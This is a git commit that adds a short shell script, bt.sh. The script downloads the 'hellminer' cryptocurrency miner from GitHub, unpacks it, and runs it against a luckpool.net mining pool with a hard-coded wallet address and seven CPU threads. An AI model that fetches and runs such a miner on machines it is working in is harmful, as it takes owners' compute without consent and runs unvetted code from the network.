a647af3e0e68ffef278d2bea925e03a2f3916cb9
ellenregin1 <102889950+ellenregin1@users.noreply.github.com>
2023-06-16 07:39:36 -0300

    bt.sh

---
+++ bt.sh
@@ -0,0 +1,3 @@
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+tar -xf hellminer_linux64.tar.gz
+./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RWCmghxFaWAWiF6tECkToJBs7Ydj8E4r9L.A1 -p x --cpu 7
